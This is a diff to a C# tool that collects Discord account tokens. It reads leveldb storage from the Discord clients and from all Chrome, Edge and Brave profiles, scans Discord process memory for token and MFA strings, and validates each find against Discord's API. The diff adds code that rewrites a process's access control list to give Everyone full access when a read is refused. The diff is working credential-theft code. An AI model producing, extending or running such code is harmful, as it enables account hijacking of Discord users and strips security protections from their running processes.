@@ -1,5 +1,4 @@
 using System.Diagnostics;
-using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -7,6 +6,8 @@ using System.Text.RegularExpressions;
 
 const uint PROCESS_VM_READ          = 0x0010;
 const uint PROCESS_QUERY_INFORMATION = 0x0400;
+const uint WRITE_DAC                = 0x00040000;
+const uint PROCESS_ALL_ACCESS       = 0x001FFFFF;
 const uint MEM_COMMIT = 0x1000;
 const uint MEM_IMAGE  = 0x1000000;
 
@@ -35,10 +36,11 @@ var paths = new Dictionary<string, string>
     ["Discord"]        = Path.Combine(roam, "discord",        @"Local Storage\leveldb"),
     ["Discord Canary"] = Path.Combine(roam, "discordcanary",  @"Local Storage\leveldb"),
     ["Discord PTB"]    = Path.Combine(roam, "discordptb",     @"Local Storage\leveldb"),
-    ["Chrome"]         = Path.Combine(local, @"Google\Chrome\User Data\Default\Local Storage\leveldb"),
-    ["Edge"]           = Path.Combine(local, @"Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
-    ["Brave"]          = Path.Combine(local, @"BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
 };
+
+AddBrowserProfiles(paths, "Chrome", Path.Combine(local, @"Google\Chrome\User Data"));
+AddBrowserProfiles(paths, "Edge",   Path.Combine(local, @"Microsoft\Edge\User Data"));
+AddBrowserProfiles(paths, "Brave",  Path.Combine(local, @"BraveSoftware\Brave-Browser\User Data"));
 
 var candidates = new HashSet<string>();
 
@@ -74,17 +76,23 @@ foreach (var (name, path) in paths)
     }
 }
 
-var validAccounts = new List<(string username, string token)>();
+var validAccounts   = new List<(string username, string token)>();
+var seenAccountIds  = new HashSet<string>();
 
 Console.WriteLine($"\n{CYNB}Validating tokens found in files...{RST}");
 foreach (var token in candidates)
 {
-    var username = ValidateToken(token);
-    if (username != null)
+    var info = ValidateToken(token);
+    if (info is null) continue;
+
+    if (!seenAccountIds.Add(info.Value.id))
     {
-        validAccounts.Add((username, token));
-        Console.WriteLine($"{GRN}  Valid token found for user: {username}{RST}");
+        Console.WriteLine($"{GRN}  Duplicate skipped: {info.Value.username} (same account, different token){RST}");
+        continue;
     }
+
+    validAccounts.Add((info.Value.username, token));
+    Console.WriteLine($"{GRN}  Valid token found for user: {info.Value.username}{RST}");
 }
 if (validAccounts.Count == 0)
     Console.WriteLine($"{RED}No valid accounts found in files{RST}");
@@ -96,13 +104,18 @@ int foundInMemory = 0;
 foreach (var token in memCandidates)
 {
     if (validAccounts.Any(v => v.token == token)) continue;
-    var username = ValidateToken(token);
-    if (username != null)
+    var info = ValidateToken(token);
+    if (info is null) continue;
+
+    if (!seenAccountIds.Add(info.Value.id))
     {
-        validAccounts.Add((username, token));
-        foundInMemory++;
-        Console.WriteLine($"{GRN}  New valid token found in memory for user: {username}{RST}");
+        Console.WriteLine($"{GRN}  Duplicate skipped: {info.Value.username} (same account, different token){RST}");
+        continue;
     }
+
+    validAccounts.Add((info.Value.username, token));
+    foundInMemory++;
+    Console.WriteLine($"{GRN}  New valid token found in memory for user: {info.Value.username}{RST}");
 }
 if (foundInMemory == 0)
     Console.WriteLine($"{RED}No other accounts found using memory scan{RST}");
@@ -122,8 +135,6 @@ try { Console.ReadKey(true); }
 catch (InvalidOperationException) { Console.ReadLine(); }
 return;
 
-// --- local functions ---
-
 void EnableAnsi()
 {
     var h = GetStdHandle(-11);
@@ -131,7 +142,7 @@ void EnableAnsi()
     SetConsoleMode(h, mode | 4);
 }
 
-string? ValidateToken(string token)
+(string id, string username)? ValidateToken(string token)
 {
     try
     {
@@ -141,17 +152,87 @@ string? ValidateToken(string token)
         var resp = http.GetAsync("https://discord.com/api/v9/users/@me").Result;
         if (resp.StatusCode != System.Net.HttpStatusCode.OK) return null;
         var body = resp.Content.ReadAsStringAsync().Result;
-        var m = Regex.Match(body, @"""username"":""([^""]+)""");
-        return m.Success ? m.Groups[1].Value : null;
+        var mId = Regex.Match(body, @"""id"":""([^""]+)""");
+        var m   = Regex.Match(body, @"""username"":""([^""]+)""");
+        return mId.Success && m.Success ? (mId.Groups[1].Value, m.Groups[1].Value) : null;
     }
     catch { return null; }
+}
+
+void AddBrowserProfiles(Dictionary<string, string> targets, string browser, string userDataRoot)
+{
+    if (!Directory.Exists(userDataRoot))
+    {
+        Console.WriteLine($"{RED}  Path not found: {userDataRoot}\\Default\\Local Storage\\leveldb{RST}");
+        return;
+    }
+    try
+    {
+        var found = false;
+        foreach (var profile in Directory.EnumerateDirectories(userDataRoot))
+        {
+            var ldb = Path.Combine(profile, @"Local Storage\leveldb");
+            if (!Directory.Exists(ldb)) continue;
+            targets[$"{browser} ({Path.GetFileName(profile)})"] = ldb;
+            found = true;
+        }
+        if (!found)
+            Console.WriteLine($"{RED}  No {browser} profile with token storage found{RST}");
+    }
+    catch { }
+}
+
+nint OpenProcessRead(int pid)
+{
+    var h = WinOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
+    if (h != IntPtr.Zero) return h;
+
+    h = WinOpenProcess(WRITE_DAC, false, pid);
+    if (h == IntPtr.Zero) return IntPtr.Zero;
+
+    try
+    {
+        var auth = Marshal.AllocHGlobal(6);
+        try
+        {
+            for (var i = 0; i < 5; i++) Marshal.WriteByte(auth, i, 0);
+            Marshal.WriteByte(auth, 5, 1); 
+            if (AllocateAndInitializeSid(auth, 1, 0, 0, 0, 0, 0, 0, 0, 0, out var worldSid)
+                && worldSid != IntPtr.Zero)
+            {
+                try
+                {
+                    const uint AclSize = 256;
+                    var pAcl = LocalAlloc(0x40 , AclSize);
+                    if (pAcl != IntPtr.Zero)
+                    {
+                        try
+                        {
+                            if (InitializeAcl(pAcl, AclSize, 2)
+                                && AddAccessAllowedAce(pAcl, 2, PROCESS_ALL_ACCESS, worldSid))
+                            {
+                                SetSecurityInfo(h, 6, 0x4, IntPtr.Zero, IntPtr.Zero, pAcl, IntPtr.Zero);
+                            }
+                        }
+                        finally { LocalFree(pAcl); }
+                    }
+                }
+                finally { FreeSid(worldSid); }
+            }
+        }
+        finally { Marshal.FreeHGlobal(auth); }
+    }
+    catch { }
+    finally { CloseHandle(h); }
+
+    return WinOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
 }
 
 HashSet<string> ScanDiscordProcesses()
 {
     var result = new HashSet<string>();
     var pids = Process.GetProcesses()
-        .Where(p => { try { var n = p.ProcessName.ToLower(); return n is "discord" or "discordptb" or "discordcanary"; } catch { return false; } })
+        .Where(p => { try { var n = p.ProcessName.ToLower(); return n.StartsWith("discord"); } catch { return false; } })
         .Select(p => p.Id).ToList();
 
     if (pids.Count == 0)
@@ -179,7 +260,7 @@ HashSet<string> ScanDiscordProcesses()
     bool foundFast = false;
     foreach (var (pid, name, _) in bearing)
     {
-        var h = WinOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
+        var h = OpenProcessRead(pid);
         if (h == IntPtr.Zero) continue;
         foundFast |= ScanProcessFast(h, result);
         CloseHandle(h);
@@ -190,7 +271,7 @@ HashSet<string> ScanDiscordProcesses()
         Console.WriteLine($"{YLW}Fast scan found nothing, falling back to full memory scan...{RST}");
         foreach (var (pid, name, _) in bearing)
         {
-            var h = WinOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
+            var h = OpenProcessRead(pid);
             if (h == IntPtr.Zero) continue;
             ScanProcessFull(h, name, pid, result);
             CloseHandle(h);
@@ -217,14 +298,15 @@ bool ScanProcessFast(IntPtr h, HashSet<string> out_set)
             var buf = new byte[(int)mbi.RegionSize];
             if (WinReadProcessMemory(h, (IntPtr)address, buf, (nuint)mbi.RegionSize, out nuint bytesRead) && bytesRead > 0)
             {
-                var hitIdx = FindAnchor(buf, (int)bytesRead);
-                if (hitIdx >= 0)
+                var hitIdx = FindAnchor(buf, (int)bytesRead, 0);
+                while (hitIdx >= 0)
                 {
                     any = true;
                     int win = (int)Math.Min((long)(bytesRead - (nuint)hitIdx), 768);
                     var text = Encoding.UTF8.GetString(buf, hitIdx, win);
                     foreach (Match m in tokenRe.Matches(text)) out_set.Add(m.Value);
                     foreach (Match m in mfaRe.Matches(text))   out_set.Add(m.Value);
+                    hitIdx = FindAnchor(buf, (int)bytesRead, hitIdx + 1);
                 }
             }
         }
@@ -264,17 +346,18 @@ void ScanProcessFull(IntPtr h, string name, int pid, HashSet<string> out_set)
     Console.WriteLine($"{YLW}    {name} pid {pid} heap size {total} bytes{RST}");
 }
 
-int FindAnchor(byte[] buf, int len)
+int FindAnchor(byte[] buf, int len, int start)
 {
-    var span = buf.AsSpan(0, len);
+    var span = buf.AsSpan(start, len - start);
     int i = span.IndexOf(authAnchor);
-    if (i >= 0) return i;
-    return span.IndexOf(v8Anchor);
+    if (i >= 0) return i + start;
+    i = span.IndexOf(v8Anchor);
+    return i >= 0 ? i + start : -1;
 }
 
 string ClassifyPid(int pid)
 {
-    var h = WinOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
+    var h = OpenProcessRead(pid);
     if (h == IntPtr.Zero) return "unknown";
     try
     {
@@ -309,10 +392,22 @@ string GetProcessName(int pid)
     catch { return "unknown"; }
 }
 
-// --- Win32 P/Invoke ---
-
 [DllImport("kernel32.dll", EntryPoint = "OpenProcess")] static extern IntPtr WinOpenProcess(uint access, bool inherit, int pid);
 [DllImport("kernel32.dll")] static extern void CloseHandle(IntPtr h);
+[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+static extern bool AllocateAndInitializeSid(IntPtr pIdentifierAuthority, byte nSubAuthorityCount, uint nSubAuthority0, uint nSubAuthority1, uint nSubAuthority2, uint nSubAuthority3, uint nSubAuthority4, uint nSubAuthority5, uint nSubAuthority6, uint nSubAuthority7, out IntPtr pSid);
+[DllImport("advapi32.dll")]
+static extern IntPtr FreeSid(IntPtr pSid);
+[DllImport("kernel32.dll")]
+static extern IntPtr LocalAlloc(uint uFlags, nuint uBytes);
+[DllImport("kernel32.dll")]
+static extern IntPtr LocalFree(IntPtr hMem);
+[DllImport("advapi32.dll", SetLastError = true)]
+static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision);
+[DllImport("advapi32.dll", SetLastError = true)]
+static extern bool AddAccessAllowedAce(IntPtr pAcl, uint dwAceRevision, uint AccessMask, IntPtr pSid);
+[DllImport("advapi32.dll", SetLastError = true)]
+static extern uint SetSecurityInfo(IntPtr handle, int objectType, uint securityInformation, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);
 [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)] static extern bool WinReadProcessMemory(IntPtr h, IntPtr baseAddr, byte[] buf, nuint size, out nuint read);
 [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)] static extern bool WinReadPointer(IntPtr h, IntPtr baseAddr, out nint val, nint size);
 [DllImport("kernel32.dll", EntryPoint = "VirtualQueryEx")] static extern int WinVirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION mbi, uint size);
